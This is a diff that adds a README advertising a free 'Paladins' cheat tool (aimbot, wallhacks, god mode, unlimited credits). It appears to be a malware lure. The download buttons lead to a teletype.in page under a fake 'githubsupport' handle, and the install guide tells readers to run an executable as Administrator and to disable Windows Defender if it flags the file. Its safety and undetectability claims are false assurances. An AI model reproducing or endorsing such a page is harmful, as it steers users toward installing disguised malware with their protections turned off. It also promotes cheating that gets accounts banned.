@@ -1,0 +1,62 @@
+# Paladins Cheat Engine 2025 - Download Hack for Windows
+
+[![Version](https://img.shields.io/badge/Version-2.5.1-blue?style=for-the-badge&logo=windows)](https://example.com)
+[![Release](https://img.shields.io/badge/Release-2025-orange?style=for-the-badge&logo=calendar)](https://example.com)
+[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows)](https://example.com)
+[![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge&logo=check-circle)](https://example.com)
+
+[![Download](https://img.shields.io/badge/Download_Now-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://teletype.in/@githubsupport/aHN9l6m-mbF?CA460F381105467EBC52782394D83BC0)
+
+---
+
+## 🔥 **Welcome to the Ultimate Paladins Hack!** 🔥  
+
+Unlock unlimited potential in **Paladins** with our cutting-edge, **100% free** hack tool designed exclusively for **Windows 2025**. Dominate every match, level up faster, and leave your opponents in awe! 🚀  
+
+### 🌟 **Features**  
+
+✔ **God Mode** – Become invincible! No damage, no fear! ⚡  
+✔ **Aimbot** – Pinpoint accuracy with auto-targeting. 🎯  
+✔ **Wallhacks** – See enemies through walls. 👁️  
+✔ **Unlimited Credits** – Buy everything instantly! 💰  
+✔ **Speed Boost** – Move faster than ever! 🏃‍♂️  
+✔ **No Cooldown** – Spam abilities endlessly! 🔄  
+✔ **Undetectable** – Anti-ban protection! 🔒  
+
+### 🛠 **Installation Guide**  
+
+1. **Download** the latest version using the button above. 📥  
+2. **Extract** the ZIP file to a secure location. 📂  
+3. **Run** `PaladinsHack.exe` as **Administrator**. ⚙️  
+4. **Launch** Paladins and enjoy! 🎮  
+
+### 📌 **Important Notes**  
+
+⚠ **Use at your own risk** – While our tool is undetectable, always stay updated.  
+⚠ **Single-player recommended** – Avoid bans by using wisely.  
+⚠ **Windows Defender** – Temporarily disable if flagged (false positive).  
+
+### ❓ **FAQ**  
+
+❔ **Is this safe?**  
+✅ Yes! Our tool uses advanced encryption to avoid detection.  
+
+❔ **Will I get banned?**  
+🛡️ No, as long as you don’t abuse it in ranked matches.  
+
+❔ **Does it work on Steam/Epic?**  
+✔ Yes, compatible with all versions!  
+
+### 🔗 **Support & Updates**  
+
+📢 **Join our Discord** for real-time support: [![Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord)](https://discord.gg/example)  
+
+🔔 **Follow us on Twitter** for announcements: [![Twitter](https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter)](https://twitter.com/example)  
+
+---
+
+### 🎉 **Ready to Rule Paladins?**  
+
+[![Download Now](https://img.shields.io/badge/Download_Now-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://teletype.in/@githubsupport/aHN9l6m-mbF?268E6F5887534A21B2EFF92A7CA701DA)  
+
+💎 **Your victory starts here!** 💎
